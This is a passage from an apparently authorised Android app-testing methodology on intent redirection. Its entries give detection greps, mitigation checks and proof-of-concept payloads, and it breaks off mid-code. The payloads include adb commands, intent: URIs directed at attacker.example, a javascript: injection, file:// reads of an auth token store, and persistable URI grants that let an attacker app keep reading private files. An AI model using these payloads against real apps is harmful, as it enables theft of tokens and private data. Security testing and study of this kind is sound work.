  prefix, with the per-file lengths logged. The differential that sells it: the same walk without the
  PREFIX flag succeeds only on the exact granted URI.
- **Escalation:** A prefix grant over a `<root-path path="."/>` FileProvider is arbitrary private-file read
  for the life of the grant — pair with D08-012 to make it permanent.
- **Ruled out when:** The forwarder strips flags by mask (`removeFlags(0xC3)` or an `IntentSanitizer` with
  no `allowFlags`), or `dumpsys activity permissions` after the prefix payload shows only the single exact
  URI granted, proving the platform refused the prefix because the provider's `<grant-uri-permission>`
  scope does not cover it.

### D08-012 · `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` — a grant that survives reboot

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` flag-sanitisation list; Microsoft EngageLab analysis — the PoC sets `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION` together; ATT&CK T1409 Stored Application Data, T1533 Data from Local System |

- **Test:** Persistable turns a one-shot confused deputy into a durable exfiltration channel. The receiving
  app calls `takePersistableUriPermission()` and keeps access across reboots and across the target app's
  own attempt to revoke, until the target explicitly calls `revokeUriPermission()` or is uninstalled.
- **How:** Add the flag to the D08-010 payload, then take and verify the grant:
  ```java
  inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
               | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
  // in LeakActivity:
  getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
  for (UriPermission p : getContentResolver().getPersistedUriPermissions())
      Log.i("D08", "persisted " + p.getUri() + " read=" + p.isReadPermission());
  ```
  ```bash
  adb shell am start -n com.target.app/.Forwarder -f 0x43 --eu android.intent.extra.STREAM \
    content://com.target.app.fileprovider/files/session_backup_payload
  # 0x43 = PERSISTABLE | WRITE | READ
  adb reboot && adb wait-for-device
  adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
  adb shell am start -n com.attacker.poc/.ReReadActivity     # reads again, post-reboot
  ```
- **Proof:** `getPersistedUriPermissions()` returning the target's authority in the attacker process
  **after a reboot**, plus the file bytes read on the second boot. Also show the read still working after
  the user "deletes" the item in the target's UI — the finding there is that delete does not delete.
- **Escalation:** → D20 (data retained beyond the user's control); → D11 for the token at rest; → D15 for
  what that token does. Note the grant dies on target-app uninstall — say so, it costs you nothing and
  buys credibility.
- **Ruled out when:** The forwarder strips the flag, or the provider does not support persistable grants
  (`takePersistableUriPermission` throws `SecurityException: No persistable permission grants found`), or
  the target calls `revokeUriPermission()` on the URI in `onDestroy` — verify that last one by re-reading
  after the activity finishes rather than assuming from the code.

### D08-013 · Component allow-list present, but extras, data and flags still attacker-controlled

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all — this is the case that defeats the most commonly deployed fix |
| **Maps to** | Ostorlab KB `INTENT_REDIRECTION` (rated High; MASVS_CODE_4, MSTG_PLATFORM_2, M4 2024); `risks/intent-redirection` (`IntentSanitizer` recommends `allowComponent` **plus** `allowData` **plus** `allowType`) |

- **Test:** A team that "fixed" intent redirection usually validated the nested intent's package and class
  only. The nested intent's **extras, action, data URI and flags remain fully attacker-controlled**. So you
  satisfy the allow-list and carry the payload anyway — the question becomes what the allow-listed target
  does with unvalidated extras.
- **How:** Confirm the check, then craft a payload that passes it:
  ```java
  Intent inner = new Intent();
  inner.setComponent(new ComponentName("com.target.app", "com.target.app.AllowedActivity")); // passes
  inner.putExtra("url", "https://attacker.example/");            // hostile
  inner.setData(Uri.parse("content://com.target.app.provider/secrets"));
  inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  ```
  Then audit the allow-listed class's entry point:
  ```bash
  grep -rn -A40 'class AllowedActivity' out/sources/ | grep -nE 'getStringExtra|getParcelableExtra|getData\(\)|loadUrl|openInputStream|new File\('
  ```
- **Proof:** The allow-listed component acting on your extra — the WebView loading your URL, the file
  handler opening your URI — with the allow-list check visibly passing in a Frida trace of the validator.
- **Escalation:** → D10 if the allow-listed target is a WebView (`loadUrl` from an extra is cross-app
  scripting); → D08-010 if it consumes `getData()`.
- **Ruled out when:** The allow-listed set contains only components that read **no** extras and no data URI
  from the forwarded intent — verify by reading each allow-listed class's `onCreate`/`onNewIntent`, not by
  trusting the allow-list's existence.

### D08-014 · `resolveActivity()`-based validation bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Ostorlab KB `INTENT_REDIRECTION`; `risks/intent-redirection` "Common Mistakes to Avoid" |

- **Test:** The hand-rolled guard that looks safe and is not:
  ```java
  Intent forward = (Intent) getIntent().getParcelableExtra("key");
  ComponentName name = forward.resolveActivity(getPackageManager());
  if (name.getPackageName().equals("safe_package")
          && name.getClassName().equals("safe_class")) {
      startActivity(forward);
  }
  ```
  `resolveActivity()` returns what the *resolver* would pick, which is not necessarily what
  `startActivity()` ultimately launches — a selector (D08-015) changes the launch target while leaving the
  resolved name alone, and the extras are unchecked regardless (D08-013).
- **How:**
  ```bash
  grep -rnE 'resolveActivity\(|resolveService\(|queryIntentActivities\(' out/sources/ -B6 -A10 \
    | grep -nE 'getPackageName\(\)\.equals|getClassName\(\)\.equals|startActivity'
  ```
  Payload A — satisfy the check, carry hostile extras (D08-013). Payload B — satisfy the check on the
  outer intent, redirect via `setSelector` (D08-015).
- **Proof:** A Frida hook on the guard printing `name.flattenToString()` as the allow-listed value, while
  `dumpsys activity activities` shows a different component resumed, or the allow-listed component acting
  on an attacker extra.
- **Escalation:** Whatever the allow-listed sink provides — commonly a WebView `loadUrl` (D10) or a file
  read.
- **Ruled out when:** The guard is applied to a **rebuilt** intent (the code constructs
  `new Intent().setClassName(pkg, cls)` from the validated names and copies only named extras) rather than
  to the received object. Validating an object you then launch unchanged is never a true negative.

### D08-015 · `setSelector()` smuggling past `setComponent(null)`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03; AM-02 when delivered through a WebView or deep link |
| **Applies to** | all. **Chrome blocks intent selectors**; most in-app WebViews and Firefox do not — so test inside the target's own WebView, not in Chrome |
| **Maps to** | Oversecured "Android: Access to app protected components" §4 — the complete mitigation is `addCategory(BROWSABLE)` **plus** `setComponent(null)` **plus** `setSelector(null)`; Oversecured "Android deep link vulnerabilities" §3; AOSP `content/Intent.java` (`setSelector`) |

- **Test:** An `Intent` can carry a *selector* Intent. When present, the selector — not the intent's own
  action/data/component — is used to find the handling component. The near-universal partial fix
  (`addCategory(BROWSABLE); setComponent(null);`) does not clear it. This is the recurring fix-bypass:
  always check for both calls.
- **How:**
  ```bash
  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags' out/sources/
  grep -rn 'setSelector\|getSelector' out/sources/
  # the finding is setComponent(null) present WITHOUT setSelector(null)
  ```
  Build both payload forms and print them:
  ```java
  Intent sel = new Intent();
  sel.setSelector(new Intent().setClassName("com.target.app", "com.target.app.AuthWebViewActivity"));
  sel.putExtra("url", "https://attacker.example/");
  Log.d("D08", sel.toUri(Intent.URI_INTENT_SCHEME));
  // intent:#Intent;S.url=https%3A%2F%2Fattacker.example%2F;SEL;component=com.target.app/.AuthWebViewActivity;end
  ```
  URI form for a `parseUri` sink:
  ```
  intent://open#Intent;scheme=myapp;component=com.target.app/.InternalActivity;action=android.intent.action.SEND;SEL;action=android.intent.action.VIEW;end
  ```
  Deliver from a page the app's WebView loads: `location.href = '<the intent: URI>';`
- **Proof:** The differential is the proof. The plain `component=` payload is blocked by
  `setComponent(null)`; the `SEL;` payload launches the same non-exported activity. Show both attempts and
  the `dumpsys activity activities` line for the second.
- **Escalation:** Same as D08-007, plus grant flags. From a WebView this is AM-02 with no attacker app
  installed.
- **Ruled out when:** The sanitisation path calls `setSelector(null)` (or uses `IntentSanitizer`, which
  drops the selector) before launching, **and** you confirmed it by sending the `SEL;` payload and
  observing the launch refused at the application layer rather than by Chrome.

### D08-016 · Implicit inner Intent matched against a non-exported component's filter

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; at targetSdk 34+ implicit intents reach only exported components — which is precisely why the app may have exported the component to keep the pattern working |
| **Maps to** | `about/versions/14/behavior-changes-14` — implicit intents are delivered only to exported components; use an explicit intent with `intent.package = context.packageName`; Google Play ASI "Implicit Internal Intent" campaign (2021-06-22); MASTG-TEST-0372; rule `mastg-android-implicit-intent-internal-communication` |

- **Test:** Two sides of the same coin. (a) A fix that blocks `component=` on the nested intent does not
  block an **implicit** inner intent whose action/category/data match an internal component's
  `<intent-filter>` — the platform resolves it for you. (b) Apps that historically dispatched internal work
  by implicit action broke at targetSdk 34 and were "fixed" by exporting the component, creating a
  permanent external entry point.
- **How:**
  ```bash
  # internal actions declared on components
  grep -nE '<action android:name="[a-z0-9._]+"' -B8 out/AndroidManifest.merged.xml | grep -B8 'exported="true"'
  # internal implicit dispatch in code
  grep -rnE 'new Intent\("[a-z0-9._]+"\)' out/sources/ -A6 | grep -E 'startActivity|startService|sendBroadcast'
  ```
  Payload — nested intent with an action and no component:
  ```java
  Intent inner = new Intent("com.target.app.INTERNAL_ACTION");
  inner.addCategory(Intent.CATEGORY_DEFAULT);
  inner.putExtra("op", "promote");
  ```
  Direct probe of the same action from outside:
  ```bash
  adb shell am start -a com.target.app.INTERNAL_ACTION --es op promote
  adb shell dumpsys package r com.target.app.INTERNAL_ACTION     # who else resolves it
  ```
- **Proof:** The internal component handling an action sent from an unprivileged package — Frida log line
  inside the handler, or the side effect, with `dumpsys package r` showing the app is the resolver.
- **Escalation:** → D05 (a competing filter with `android:priority="999"` lets you intercept the app's own
  internal broadcasts instead); → D04 if the internal component performs a privileged action.
- **Ruled out when:** Every internal dispatch uses `intent.setPackage(getPackageName())` or an explicit
  component **and** no internal action appears on an exported component in the merged manifest. Note the
  `exported` default flips at targetSdk 31 — a component with an `<intent-filter>` and no explicit
  `android:exported` is exported below 31.

### D08-017 · No `IntentSanitizer` and no component allow-list on a forwarding path

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | inherits the redirect it enables |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` — `androidx.core.content.IntentSanitizer` with `allowComponent`, `allowData`, `allowType`, `sanitizeByThrowing`; MASWE-0032 |

- **Test:** The structural half of the finding, and the part that survives a "we will fix it later"
  response: the platform names a specific mitigation, and it is absent on a path that forwards an
  externally supplied intent.
- **How:**
  ```bash
  grep -rn 'IntentSanitizer' out/sources/            # absence on a forwarding path is the gap
  grep -rn 'ComponentName\|resolveActivity\|getPackageName()\.equals\|getClassName()\.equals' out/sources/ -A4
  ```
  The documented safe shape to compare against:
  ```kotlin
  val intent = IntentSanitizer.Builder()
      .allowComponent("com.example.ActivityA")
      .allowData("com.example")
      .allowType("text/plain")
      .build()
      .sanitizeByThrowing(intent)
  ```
- **Proof:** The forwarding method, decompiled, with no sanitiser and no allow-list, alongside the working
  redirect from D08-007. On its own this is a code-quality observation, not a finding — always pair it.
- **Escalation:** Straight into whichever redirect you proved; this is the remediation paragraph of that
  report, not a separate submission.
- **Ruled out when:** Every forwarding path either uses `IntentSanitizer(...).sanitizeByThrowing()` with a
  closed allow-list, or rebuilds the intent from scratch. See D08-018 before accepting a sanitiser at face
  value.

### D08-018 · `IntentSanitizer` present but configured permissively

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` (`androidx.core.content.IntentSanitizer`, `sanitizeByThrowing`) |

- **Test:** A mitigation that is present and believed effective is worse than none, because it stops
  further review by both the vendor and the next tester. The builder is only as strong as its allow-list,
  and there are three specific ways to neuter it: `allowAnyComponent()`, `allowHistoryStackFlags()`, and
  consuming the result with `sanitize(intent, logger)` (log-and-continue) instead of
  `sanitizeByThrowing(intent)`.
- **How:**
  ```bash
  grep -rnA14 'IntentSanitizer' out/sources/ \
    | grep -nE 'allowAnyComponent|allowComponent|allowPackage|allowData|allowType|allowFlags|allowHistoryStackFlags|allowExtra|sanitizeByThrowing|sanitize\('
  ```
  For each site record: which fields are allow-listed, whether `allowFlags` permits `FLAG_GRANT_*`, and
  whether the return value of `sanitize()` is actually the object that gets launched (a very common bug is
  calling the sanitiser and then launching the **original** reference).
- **Proof:** The builder configuration with `allowAnyComponent()` or a no-op `sanitize()` callback, plus a
  successful redirect through it. The strongest variant: a Frida hook showing the sanitiser returning a
  cleaned intent while `startActivity` receives the uncleaned one.
- **Escalation:** As D08-007/D08-010 — and note in the report that the app already imports the correct API,
  so the fix is a configuration change, not a redesign.
- **Ruled out when:** Every sanitiser site uses `sanitizeByThrowing`, allow-lists concrete components and
  data authorities, does not call `allowAnyComponent()`, and the sanitised return value is the object
  passed to the sink — confirmed by reading the assignment, not the call.

### D08-019 · `Intent.removeLaunchSecurityProtection()` present in app code

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 16 / API 36 for the direct API; the reflective form is used by apps compiling against API 35 and below, so grep at any compile target |
| **Maps to** | `risks/intent-redirection` — "Android 16 introduces by-default security hardening for intent redirection exploits", `removeLaunchSecurityProtection()`, "Only opt out when absolutely necessary"; `about/versions/16/behavior-changes-all` — "Android 16 introduces a new API that allows apps to opt out of launch security protections… You can directly use the `removeLaunchSecurityProtection()` method on the Intent object", with the warning that "opting out of security protections increases vulnerability risk" |

- **Test:** Android 16 blocks launching an unparcelled embedded Intent when the provenance token is
  invalid, when the creator could not itself have launched the target, or when the creator could not grant
  the requested URI access. A single call to `removeLaunchSecurityProtection()` disables that for the
  launch. Its presence is a deliberate, greppable removal of a platform mitigation on the one code path the
  developer knew was doing nested-intent launching.
- **How:**
  ```bash
  grep -rn 'removeLaunchSecurityProtection' out/sources/ out/smali*/
  # the reflective form for apps compiled against API <= 35 — no corpus grep includes this
  grep -rn 'getDeclaredMethod("removeLaunchSecurityProtection")\|"removeLaunchSecurityProtection"' out/sources/ out/smali*/
  ```
  Then run D08-004 and show the same payload succeeding here where it is blocked on a stock API-36 build.
- **Proof:** The decompiled call site, plus the redirection PoC working on an Android 16 device. Lead the
  report with the opt-out and use the redirect as the impact demonstration — that ordering is what turns a
  "mitigated on modern Android" argument into a finding.
- **Escalation:** Re-enables every item in this chapter on the one platform version that would otherwise
  close them.
- **Ruled out when:** Neither the symbolic nor the reflective form appears in `sources/` **or** `smali*/`
  (check both — the call can survive obfuscation as a string literal), and the D08-004 run shows API 36
  blocking the redirect.

### D08-020 · `android:intentMatchingFlags="none"` on an exported component

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk 36+ |
| **Maps to** | `about/versions/16/behavior-changes-16` — "Safer Intents", `android:intentMatchingFlags` with values `enforceIntentFilter`, `none`, `allowNullAction` |

- **Test:** Android 16 requires explicit intents to match the target component's intent filter and blocks
  action-less intents from matching filters. The per-component opt-out is `android:intentMatchingFlags`.
  A component carrying `none` is asking to receive intents the platform would otherwise reject; one
  carrying `allowNullAction` re-opens the action-less match specifically.
- **How:**
  ```bash
  grep -nE 'intentMatchingFlags' out/AndroidManifest.merged.xml
  # record the value per component: enforceIntentFilter (hardened) | none (opt-out) | allowNullAction
  ```
  Then deliver an intent that should be filtered:
  ```bash
  adb shell am start -n com.target.app/.ExportedActivity --es payload X    # no -a action
  adb shell dumpsys activity activities | grep -m1 mResumedActivity
  ```
- **Proof:** The attribute on the component, plus delivery of an action-less or filter-mismatched intent
  that reaches `onCreate` — shown by a Frida hook printing `getIntent().getAction()` as `null`.
- **Escalation:** Severity comes from what the component then does; on its own it is a hardening opt-out.
  Combine with D08-019: an app that sets both has disabled the Android 16 intent hardening on both axes.
- **Ruled out when:** No component declares `intentMatchingFlags`, or every declaration is
  `enforceIntentFilter`. On targetSdk < 36 the attribute is inert — say so rather than reporting it.

### D08-021 · Task and launch flags preserved through the forward

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` (the sanitisation step includes checking and clearing flags); AOSP `content/Intent.java` flag constants; `FLAG_DEBUG_LOG_RESOLUTION = 0x00000008` |

- **Test:** Grant flags are not the only ones that matter. A forward that preserves
  `FLAG_ACTIVITY_NEW_TASK`, `FLAG_ACTIVITY_CLEAR_TOP`, `FLAG_ACTIVITY_CLEAR_TASK`,
  `FLAG_ACTIVITY_NO_HISTORY` or `FLAG_ACTIVITY_FORWARD_RESULT` lets you manipulate the victim's task stack
  — clearing the authenticated screen underneath your injected activity, or forwarding a result to a
  component that believes it is talking to the original caller.
- **How:**
  ```bash
  grep -rn 'getFlags()\|setFlags(\|addFlags(\|removeFlags(' out/sources/ | head -40
  ```
  Probe each flag independently, one `am start` per flag, and record which survive:
  ```bash
  for F in 0x10000000 0x04000000 0x08000000 0x40000000 0x02000000; do
    adb shell am start -n com.target.app/.Forwarder -f $F --es payload X
    adb shell dumpsys activity activities | sed -n '/Task/,/mResumedActivity/p' | head -20
  done
  # resolver trace to see what the platform actually picked:
  adb shell am start -a android.intent.action.VIEW -f 0x00000008 -d 'myapp://route'
  adb logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
  ```
- **Proof:** `dumpsys activity activities` showing the victim's task with your activity on top and the
  previous entries cleared, or a result delivered to a component that never called you.
- **Escalation:** → D04 UI redress / task hijack. On its own this is a Medium; it becomes the delivery
  mechanism for a phishing overlay when combined with the D08-048 background-activity-launch opt-in.
- **Ruled out when:** The forwarding path masks flags to a known-good set before launch (e.g.
  `forward.setFlags(forward.getFlags() & ALLOWED_MASK)`) and the per-flag probe shows every task flag
  dropped — read `dumpsys` after each probe rather than assuming from the code.

### D08-022 · `Intent.parseUri()` on attacker-controlled text

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — argue toward `broken_authentication_and_session_management.authentication_bypass` (P1) on the reached component |
| **Attacker** | AM-02 (a link is enough; no attacker app installed) |
| **Applies to** | all |
| **Maps to** | AOSP `content/Intent.java` (`parseUri`, `URI_INTENT_SCHEME`, `URI_ALLOW_UNSAFE`, `URI_ANDROID_APP_SCHEME`); MASWE-0029 (CWE-939, CWE-917); MASWE-0032 (CWE-927); Oversecured deep-link taxonomy "Intent redirection via WebView — `Intent.parseUri()` launching non-exported internal Activities"; CVE-2020-14116 (Xiaomi Mi Browser), CVE-2024-26131 (Element Android — WebView manipulation, PIN bypass, login hijack) |

- **Test:** Any place the app turns a string into an `Intent` — a deep-link parameter, a WebView URL, a QR
  payload, a push body — gives the attacker a component selector, flags and typed extras, delivered from a
  web origin. This is the same bug as D08-007 with the attacker model moved from AM-03 to AM-02, which is
  usually a full severity band.
- **How:**
  ```bash
  grep -rnE 'Intent\.parseUri\(|parseUri\(' out/sources/ -B6 -A10
  grep -rn 'URI_INTENT_SCHEME\|URI_ANDROID_APP_SCHEME\|URI_ALLOW_UNSAFE' out/sources/
  # and the post-parse sanitisation — its absence is the gap
  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags\|addCategory(Intent.CATEGORY_BROWSABLE)' out/sources/
  ```
  Payloads, escalating:
  ```
  intent://x/#Intent;component=com.target.app/.internal.SecretActivity;S.token=x;end
  intent:#Intent;component=com.target.app/.WebActivity;S.url=https%3A%2F%2Fattacker.example%2F;end
  intent:#Intent;action=android.intent.action.VIEW;S.url=file:///data/data/com.target.app/shared_prefs/auth.xml;end
  intent:#Intent;S.url=x;SEL;component=com.target.app/.internal.SecretActivity;end
  ```
  Delivery through the app's own router:
  ```bash
  adb shell am start -a android.intent.action.VIEW \
    -d 'myapp://open?next=intent%3A%23Intent%3Bcomponent%3Dcom.target.app%2F.internal.AdminActivity%3Bend'
  ```
- **Proof:** The internal component launches from a plain hyperlink with no attacker app installed —
  screenshot plus `dumpsys activity activities | grep -m1 mResumedActivity`. The contrast that proves the
  boundary crossing: the shell `am start -n` on the same component is refused with `Permission Denial`.
- **Escalation:** → D09 for the delivery chain and per-browser reach; → D10 if it lands in a WebView; add
  `launchFlags=` to carry grant flags into D08-010.
- **Ruled out when:** No `parseUri`/`getIntent(String)` call exists outside framework packages, or every
  call is followed — before the launch — by `setComponent(null)`, `setPackage(null)`, `setSelector(null)`,
  `addCategory(CATEGORY_BROWSABLE)` and an explicit flag mask, and the `SEL;` payload from D08-015 is
  refused.

### D08-023 · `Intent.URI_ALLOW_UNSAFE` (flag value 4) on externally sourced data

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the token-bearing file |
| **Attacker** | AM-03, AM-02 |
| **Applies to** | all API levels |
| **Maps to** | Microsoft Security Blog (2026-04-09) on EngageLab EngageSDK — flow `onCreate()`/`onNewIntent()` → `processIntent()` → `processPlatformMessage()` → extracts `n_intent_uri` → `parseUri()` with `URI_ALLOW_UNSAFE` (constant value 4) → returns an **explicit** intent, bypassing the platform's implicit-intent protections; vulnerable ≤ 4.5.4, fixed 5.2.1 (2025-11-03); **no CVE was published — do not cite one**; Android docs for `URI_ALLOW_UNSAFE` and `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` |

- **Test:** `URI_ALLOW_UNSAFE` preserves fields that the safe parse modes strip — including flags. Because
  the resulting intent is **explicit** and originates from the host app, it bypasses the implicit-intent
  restrictions and can carry `FLAG_GRANT_*` against the host's own providers. The literal is `4`, which no
  ordinary grep for a symbolic name will catch in obfuscated SDK code.
- **How:**
  ```bash
  grep -rn "parseUri(" out/sources/ | grep -viE '^out/sources/(android|androidx)/'
  grep -rn "URI_ALLOW_UNSAFE" out/sources/
  # the numeric literal form, which is what survives obfuscation
  grep -rnE 'parseUri\([^,]+,\s*4\s*\)' out/sources/
  grep -rn 'n_intent_uri\|processPlatformMessage\|MTCommonActivity' out/sources/
  ```
  PoC against a JSON-wrapped SDK payload:
  ```bash
  adb shell am start -n com.target.app/com.engagelab.privates.push.platform.MTCommonActivity \
    --es <sdk_message_key> '{"n_intent_uri":"intent:#Intent;component=com.attacker.poc/.Sink;S.uri=content://com.target.app.provider/;launchFlags=0x43;end"}'
  adb shell am start -n com.target.app/.SdkProxyActivity \
    --es payload '{"n_intent_uri":"intent:#Intent;action=android.intent.action.VIEW;data=content://com.target.app.fileprovider/root/secret.xml;launchFlags=0x43;end"}'
  ```
- **Proof:** In the attacker app, `getContentResolver().getPersistedUriPermissions()` returns a grant
  against the target's authority, and a subsequent `openInputStream()` returns the target's private bytes.
  Screenshot both, and re-read after a process restart to show persistence.
- **Escalation:** → D11 (read the token DB) → D15 (account takeover). With write flags, → D17.
- **Ruled out when:** No `parseUri` call passes `4`/`URI_ALLOW_UNSAFE`, confirmed by reading the second
  argument at every call site including SDK packages, and no obfuscated numeric-literal form matches. A
  `URI_INTENT_SCHEME` parse is still a finding under D08-022 — do not treat it as a negative here.

### D08-024 · WebView `shouldOverrideUrlLoading` turned into an arbitrary-component launcher

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the JS-in-privileged-origin outcome is `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-02, AM-09 (malicious backend/CDN serving a page the WebView loads) |
| **Applies to** | all |
| **Maps to** | Oversecured "Android: Access to app protected components" §4; Google Mobile VRP class "Cross-app scripting" — "Apps that load untrusted URLs from other apps into their WebViews that match a certain form (e.g., `javascript:` or `file:///path/to/private`) allow malicious JavaScript code execution"; MASWE-0032; CVE-2024-26131 (Element Android) |

- **Test:** `shouldOverrideUrlLoading` that calls `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)` and then
  `startActivity()` turns any page the WebView renders — including one reached via an open redirect or an
  XSS on a legitimately allow-listed host — into an arbitrary-component launcher running as the app.
- **How:**
  ```bash
  grep -rn 'shouldOverrideUrlLoading' out/sources/ -A25 | grep -nE 'parseUri|startActivity|URI_INTENT_SCHEME|setComponent\(null\)|setSelector\(null\)'
  ```
  Host a page and load it in the target's WebView:
  ```html
  <script>
    location.href = 'intent:#Intent;component=com.target.app/.AuthWebViewActivity;S.url=https%3A%2F%2Fattacker.example%2F;end';
  </script>
  ```
  Then the selector variant (D08-015) to defeat a `setComponent(null)` fix, and:
  ```
  intent:#Intent;component=com.target.app/.WebActivity;S.url=javascript://legitimate.example/%0aalert(document.domain);end
  ```
- **Proof:** The non-exported activity launching from a plain web page rendered inside the app, with
  `alert(document.domain)` firing in the app's WebView origin, or the contents of a private file rendered.
  Record which WebView (the app's own, not Chrome) and which Android version.
- **Escalation:** → D10 for the bridge surface once you are inside the privileged origin; → D08-010 to
  carry grant flags in the same `intent:` string via `launchFlags=`.
- **Ruled out when:** `shouldOverrideUrlLoading` returns `false` for every non-`http(s)` scheme, or the
  `intent:` branch applies `setComponent(null)` **and** `setSelector(null)` **and** `addCategory(BROWSABLE)`
  **and** a flag mask — verified by sending all three payload forms and observing refusal.

### D08-025 · Legacy `Intent.getIntent()` / `getIntentOld()` parsers

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-02 |
| **Applies to** | LEGACY — pre-`parseUri` API surface still present in old code paths and in vendored SDKs |
| **Maps to** | AOSP `content/Intent.java`; MASWE-0032 |

- **Test:** `Intent.getIntent(String)` and `Intent.getIntentOld(String)` are the deprecated ancestors of
  `parseUri` and carry the same primitive with none of the modern parse-mode options. Code that uses them
  is usually old enough to predate every mitigation in this chapter.
- **How:**
  ```bash
  grep -rnE 'Intent\.getIntent\(|Intent\.getIntentOld\(' out/sources/ out/smali*/
  ```
  Same payload catalogue as D08-022.
- **Proof:** The named internal component starting from a string the attacker supplied, with the call site
  decompiled alongside.
- **Escalation:** As D08-022.
- **Ruled out when:** Neither symbol appears in `sources/` or `smali*/`.

### D08-026 · Push / messaging payload field parsed into an Intent

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with the grant chain, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-09 (malicious or compromised backend), AM-08 (malicious SDK), AM-03 when the receiver is exported |
| **Applies to** | all apps with push, in-app messaging or remote-config-driven routing |
| **Maps to** | Microsoft EngageLab analysis (the `n_intent_uri` JSON field); MASWE-0032; MASWE-0029 |

- **Test:** The redirection sink is often not reached from another app at all — it is reached from the
  network. A push handler that extracts a URL or `intent:` string from the message data and routes it is an
  intent-redirection sink with an AM-09 attacker, and on an exported push receiver an AM-03 one too.
- **How:**
  ```bash
  grep -rnE 'onMessageReceived|RemoteMessage|getData\(\)\.get\(|getNotification\(\)\.getClickAction' out/sources/ -A12 \
    | grep -nE 'parseUri|startActivity|Uri\.parse|setComponent|setClassName'
  grep -nE 'com.google.firebase.MESSAGING_EVENT|<receiver' -A8 out/AndroidManifest.merged.xml | grep -n 'exported="true"'
  ```
  Deliver the payload three ways and note which work: your own FCM send to a test token; a forged local
  broadcast if the receiver is exported; and `am start` on the handling activity with the same extras.
- **Proof:** The routed component launching with attacker-chosen extras, plus the exact message field that
  carried it. If the receiver is exported and unprotected, show a zero-permission local app delivering the
  same payload.
- **Escalation:** → D24 for the push-channel trust model; the finding is much stronger if the backend
  accepts the routing field from any authenticated user (→ D15).
- **Ruled out when:** The push handler routes only through a closed server-side-defined enum of screen ids
  mapped locally to explicit components, never through a URL or `intent:` string, and the messaging
  receiver is not exported or is protected by the messaging framework's own signature permission.

### D08-027 · `Parcel.unmarshall()` + `readParcelable()` on a deep-link parameter

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); RCE outcome `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | Oversecured "Android: Access to app protected components" §5 — exact shape `deeplink://handle/?param=<base64>` → `parcel.unmarshall` → `startActivity((Intent) parcel.readParcelable(...))`; H1 #2289836 (MercadoLibre, High 8.6) for the same-impact class; MASWE-0050 |

- **Test:** Some routers base64-decode a deep-link parameter into a `Parcel` and read an `Intent` out of
  it. This is an intent-redirection primitive that **no manifest analysis will find**, it is reachable from
  a web page, and it simultaneously hands the attacker a raw `Parcelable` deserialisation surface.
- **How:**
  ```bash
  grep -rn 'Parcel.obtain()\|unmarshall(\|readParcelable(' out/sources/ -B8 -A8 \
    | grep -inE 'getData\(\)|getQueryParameter|Base64.decode'
  ```
  The vulnerable shape:
  ```java
  byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
  Parcel parcel = Parcel.obtain();
  parcel.unmarshall(handle, 0, handle.length);
  parcel.setDataPosition(0);
  startActivity((Intent) parcel.readParcelable(getClassLoader()));
  ```
  Build the blob in a stub app and print it:
  ```java
  Intent evil = new Intent();
